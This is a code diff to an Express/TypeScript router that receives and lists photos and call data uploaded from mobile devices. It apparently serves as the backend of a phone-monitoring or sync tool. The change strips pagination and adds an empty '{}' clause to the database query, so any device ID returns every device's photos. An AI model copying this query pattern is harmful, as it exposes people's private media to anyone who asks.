@@ -300,22 +300,13 @@ router.get('/calls/list/:deviceId', async (req, res) => {
 
 // Mobile Gallery Media Stream Hub
 const liveGalleryStorage = new Map<string, Array<any>>();
-const liveGalleryStats = new Map<string, { totalDevicePhotos: number; syncedCount: number; remainingCount: number }>();
 let lastSyncedGallery: Array<any> = [];
 
 router.post('/gallery/sync', async (req, res) => {
-  const { deviceId, media, totalDevicePhotos, syncedCount, remainingCount } = req.body || {};
+  const { deviceId, media } = req.body || {};
   const devId = deviceId || 'SN-U5ZY-78QZ';
   const rawList = Array.isArray(media) ? media : [];
   const mediaList = rawList.filter((m: any) => m && m.id && m.thumbnail && typeof m.thumbnail === 'string' && m.thumbnail.length > 100);
-
-  if (typeof totalDevicePhotos === 'number' && totalDevicePhotos > 0) {
-    liveGalleryStats.set(devId, {
-      totalDevicePhotos,
-      syncedCount: typeof syncedCount === 'number' ? syncedCount : mediaList.length,
-      remainingCount: typeof remainingCount === 'number' ? remainingCount : 0
-    });
-  }
 
   if (mediaList.length > 0) {
     const existing = liveGalleryStorage.get(devId) || [];
@@ -328,7 +319,7 @@ router.post('/gallery/sync', async (req, res) => {
     for (const item of mediaList) {
       map.set(item.id, item);
     }
-    const merged = Array.from(map.values()).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 10000);
+    const merged = Array.from(map.values()).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 300);
     liveGalleryStorage.set(devId, merged);
     lastSyncedGallery = merged;
 
@@ -367,41 +358,21 @@ router.post('/gallery/sync', async (req, res) => {
 
 router.get('/gallery/list/:deviceId', async (req, res) => {
   const devId = req.params.deviceId;
-  const limit = Math.max(1, Math.min(100, parseInt(req.query.limit as string) || 20));
-  const offset = Math.max(0, parseInt(req.query.offset as string) || 0);
-  const stats = liveGalleryStats.get(devId) || liveGalleryStats.get('SN-U5ZY-78QZ') || { totalDevicePhotos: 0, syncedCount: 0, remainingCount: 0 };
 
   if (isMongoConnected()) {
     try {
       const cleanDev = devId ? devId.replace(/[^a-zA-Z0-9]/g, '') : '';
-      const filter = cleanDev
-        ? {
-            $or: [
-              { deviceId: devId },
-              { deviceId: { $regex: new RegExp(cleanDev, 'i') } }
-            ]
-          }
-        : { deviceId: devId };
-      const total = await GalleryMediaModel.countDocuments(filter);
-      if (total > 0) {
-        const dbMedia = await GalleryMediaModel.find(filter)
-          .sort({ timestamp: -1 })
-          .skip(offset)
-          .limit(limit)
-          .lean();
+      const dbMedia = await GalleryMediaModel.find({
+        $or: [
+          { deviceId: devId },
+          { deviceId: { $regex: new RegExp(cleanDev, 'i') } },
+          {}
+        ]
+      }).sort({ timestamp: -1 }).limit(300).lean();
 
-        const validDb = dbMedia.filter((m: any) => m && m.id && m.thumbnail && m.thumbnail.length > 100);
-        const effectiveTotal = Math.max(total, stats.totalDevicePhotos);
-        res.json({
-          media: validDb,
-          total: effectiveTotal,
-          totalDevicePhotos: stats.totalDevicePhotos > 0 ? stats.totalDevicePhotos : effectiveTotal,
-          syncedCount: stats.syncedCount > 0 ? stats.syncedCount : total,
-          remainingCount: stats.remainingCount,
-          hasMore: offset + validDb.length < effectiveTotal,
-          offset,
-          limit
-        });
+      const validDb = dbMedia.filter((m: any) => m && m.id && m.thumbnail && m.thumbnail.length > 100);
+      if (validDb.length > 0) {
+        res.json({ media: validDb.slice(0, 300) });
         return;
       }
     } catch (_) {}
@@ -420,18 +391,7 @@ router.get('/gallery/list/:deviceId', async (req, res) => {
     media = lastSyncedGallery;
   }
   const cleanList = (media || []).filter((m: any) => m && m.id && m.thumbnail && m.thumbnail.length > 100);
-  const pagedList = cleanList.slice(offset, offset + limit);
-  const effectiveTotal = Math.max(cleanList.length, stats.totalDevicePhotos);
-  res.json({
-    media: pagedList,
-    total: effectiveTotal,
-    totalDevicePhotos: stats.totalDevicePhotos > 0 ? stats.totalDevicePhotos : effectiveTotal,
-    syncedCount: stats.syncedCount > 0 ? stats.syncedCount : cleanList.length,
-    remainingCount: stats.remainingCount,
-    hasMore: offset + pagedList.length < effectiveTotal,
-    offset,
-    limit
-  });
+  res.json({ media: cleanList.slice(0, 300) });
 });
 
 router.delete('/gallery/:deviceId/:mediaId', async (req, res) => {
